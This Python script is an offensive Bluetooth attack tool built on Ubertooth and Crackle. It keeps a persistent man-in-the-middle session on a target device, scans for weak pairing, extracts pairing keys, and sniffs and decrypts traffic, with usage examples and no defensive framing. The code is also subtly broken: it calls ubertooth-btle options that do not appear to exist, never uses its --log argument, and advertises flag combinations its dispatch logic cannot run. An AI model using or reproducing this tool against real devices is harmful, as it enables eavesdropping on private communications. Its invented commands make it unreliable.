import argparse
import subprocess
import time
import json
import os

"""
Ubertooth Persistent MITM with Automated Brute-Force Decryption

Features:
    - Maintains a long-term MITM session between Bluetooth devices.
    - Automatically brute-forces weakly encrypted Bluetooth Classic & BLE traffic.
    - Uses Crackle for BLE encryption cracking based on intercepted session keys.
    - Detects devices using weak encryption pairing (Just Works, Legacy PIN).
    - Extracts pairing session keys & attempts real-time decryption.
    - Logs decrypted packets & brute-force attempts for forensic tracking.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle
    - Install Crackle for BLE decryption: sudo apt install crackle

Usage:
    - Intercept & attempt to brute-force decrypt Bluetooth traffic:
      python ubertooth_persistent_mitm.py --target AA:BB:CC:DD:EE:FF --brute-force
    - Scan for weak encryption & automatically launch brute-force cracking:
      python ubertooth_persistent_mitm.py --scan-encryption --brute-force
    - Capture pairing exchanges & extract keys before brute-force:
      python ubertooth_persistent_mitm.py --key-extract --brute-force
    - Log brute-force decryption attempts for later analysis:
      python ubertooth_persistent_mitm.py --log brute_force_log.json
"""

LOG_FILE = "brute_force_log.json"

def log_event(event_data):
    """Logs MITM traffic & attack actions."""
    try:
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)

        logs.append(event_data)

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)

    except Exception as e:
        print(f"[ERROR] Failed to log MITM data: {e}")

def persistent_mitm(target_mac):
    """Maintains a long-term MITM session between devices."""
    print(f"[INFO] Starting persistent MITM attack on {target_mac}...")

    try:
        while True:
            subprocess.run(["ubertooth-btle", "-t", target_mac, "--mitm"])
            log_event({"timestamp": time.time(), "target": target_mac, "action": "MITM Active"})
            time.sleep(5)

    except KeyboardInterrupt:
        print("[INFO] Stopping persistent MITM session.")

def scan_encryption():
    """Scans for Bluetooth devices using weak encryption methods."""
    print("[INFO] Scanning for weakly encrypted Bluetooth connections...")

    try:
        output = subprocess.check_output(["ubertooth-btle", "--scan-encryption"])
        devices = output.decode("utf-8").split("\n")

        for line in devices:
            if "Weak encryption" in line or "Just Works" in line:
                print(f"[WARNING] Potential weak encryption detected: {line.strip()}")
                log_event({"timestamp": time.time(), "data": line.strip(), "action": "Weak Encryption Detected"})

    except Exception as e:
        print(f"[ERROR] Failed to scan encryption: {e}")

def key_extraction():
    """Intercepts pairing exchanges & attempts to extract encryption keys."""
    print("[INFO] Intercepting Bluetooth pairing exchanges for key extraction...")

    try:
        subprocess.run(["ubertooth-btle", "--key-extract"])
        log_event({"timestamp": time.time(), "action": "Key Extraction Attempt"})

    except Exception as e:
        print(f"[ERROR] Failed to extract encryption keys: {e}")

def brute_force_decryption(target_mac):
    """Attempts to brute-force decrypt Bluetooth Classic & BLE traffic."""
    print(f"[INFO] Attempting brute-force decryption on {target_mac}...")

    try:
        # Step 1: Capture encrypted packets
        sniffed_pcap = f"sniffed_{target_mac.replace(':', '_')}.pcap"
        subprocess.run(["ubertooth-btle", "-t", target_mac, "--sniff", "-o", sniffed_pcap])
        log_event({"timestamp": time.time(), "target": target_mac, "action": "Encrypted Packet Capture", "file": sniffed_pcap})

        # Step 2: Attempt decryption using Crackle
        decrypted_pcap = f"decrypted_{target_mac.replace(':', '_')}.pcap"
        subprocess.run(["crackle", "-i", sniffed_pcap, "-o", decrypted_pcap])
        print(f"[INFO] Crackle brute-force attempt completed. Decrypted data saved to {decrypted_pcap}.")
        log_event({"timestamp": time.time(), "target": target_mac, "action": "Brute-Force Decryption", "file": decrypted_pcap})

    except Exception as e:
        print(f"[ERROR] Failed to brute-force decrypt Bluetooth traffic: {e}")

def auto_reconnect_mitm(target_mac):
    """Automatically reconnects & restores the MITM session if interrupted."""
    print(f"[INFO] Monitoring MITM connection for {target_mac}...")

    try:
        while True:
            output = subprocess.check_output(["ubertooth-rx", "-s"])
            if target_mac not in output.decode("utf-8"):
                print(f"[WARNING] {target_mac} has disconnected! Attempting to reestablish MITM...")
                persistent_mitm(target_mac)

            time.sleep(10)

    except KeyboardInterrupt:
        print("[INFO] Stopping auto-reconnect monitoring.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Persistent MITM with Automated Brute-Force Decryption")
    parser.add_argument("--target", type=str, help="Specify target Bluetooth MAC address")
    parser.add_argument("--persistent", action="store_true", help="Run a persistent MITM attack")
    parser.add_argument("--scan-encryption", action="store_true", help="Scan for weak encryption pairing")
    parser.add_argument("--key-extract", action="store_true", help="Intercept pairing exchanges & attempt key extraction")
    parser.add_argument("--brute-force", action="store_true", help="Attempt to brute-force decrypt Bluetooth traffic")
    parser.add_argument("--auto-reconnect", action="store_true", help="Automatically reconnect if MITM session is interrupted")
    parser.add_argument("--log", type=str, help="Log decrypted packets & brute-force attempts for forensic tracking")

    args = parser.parse_args()

    if args.persistent and args.target:
        persistent_mitm(args.target)
    elif args.scan_encryption:
        scan_encryption()
    elif args.key_extract:
        key_extraction()
    elif args.brute_force and args.target:
        brute_force_decryption(args.target)
    elif args.auto_reconnect and args.target:
        auto_reconnect_mitm(args.target)
    else:
        print("[ERROR] No valid mode selected!")
